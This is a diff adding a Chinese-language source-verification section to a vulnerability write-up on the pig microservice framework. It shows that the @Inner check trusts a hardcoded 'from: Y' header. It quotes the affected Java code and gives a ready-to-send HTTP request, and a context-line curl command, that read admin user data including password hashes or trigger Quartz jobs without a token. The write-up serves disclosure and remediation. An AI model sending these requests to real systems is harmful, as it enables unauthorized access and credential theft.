@@ -150,6 +150,56 @@ curl -X POST -H "from: Y" http://<quartz-host>:5007/sys-job/run/<jobId>
 5. **Quartz / Codegen 严格权限控制**：即使在内部调用中也要二次鉴权，不允许通过 `@Inner` 绕过管理员权限
 6. **部署网络隔离**：K8s NetworkPolicy / VPC 安全组严格控制微服务间横向通信
 
+## 源代码验证（已复现）
+
+pig 微服务架构部署复杂（需 Nacos + Gateway + 多个微服务），以下通过**源代码静态分析**验证三处关键代码位置。
+
+### 验证1：@Inner 鉴权逻辑仅依赖 Header 的代码确认
+
+**文件**：`pig-common/pig-common-security/src/main/java/com/pig4cloud/pig/common/security/component/PigSecurityInnerAspect.java`（第 60-61 行）
+
+```java
+String header = request.getHeader(SecurityConstants.FROM);  // 读取请求头 "from"
+if (inner.value() && !StrUtil.equals(SecurityConstants.FROM_IN, header)) {
+    throw new AccessDeniedException("Access is denied");
+    // ← 唯一校验：from 头等于 "Y" 即通过，无签名/无加密
+}
+```
+
+### 验证2：SecurityConstants 硬编码 Header 名与值
+
+**文件**：`pig-common/pig-common-core/src/main/java/com/pig4cloud/pig/common/core/constant/SecurityConstants.java`（第 43、48 行）
+
+```java
+String FROM_IN = "Y";    // 第 43 行：校验值为字符串 "Y"
+String FROM    = "from"; // 第 48 行：Header 名为 "from"
+```
+
+任何攻击者只需在请求中附加 `from: Y` 即可通过所有 `@Inner(value=true)` 接口校验。
+
+### 验证3：@Inner 注解保护的高危接口
+
+**文件**：`pig-upms/pig-upms-biz/src/main/java/com/pig4cloud/pig/admin/controller/SysUserController.java`（第 69-74 行）
+
+```java
+@Inner                                   // ← 仅 from:Y 即可访问，无 OAuth2 Token
+@GetMapping(value = { "/info/query" })
+@Operation(summary = "查询用户信息", description = "查询用户信息")
+public R info(UserDTO userDTO) {
+    return userService.getUserInfo(userDTO);  // 返回完整用户信息含密码哈希
+}
+```
+
+**攻击者只需发送**（前提：能直接访问 pig-upms 端口，绕过 Gateway）：
+
+```http
+GET /user/info/query?username=admin HTTP/1.1
+Host: pig-upms-host:4000
+from: Y
+```
+
+**响应中将包含**：用户名、密码哈希（BCrypt）、角色、手机等完整用户信息，无需任何 OAuth2 Token。
+
 ## 验证环境
 
 - 源代码：pig 最新分支（静态代码分析）
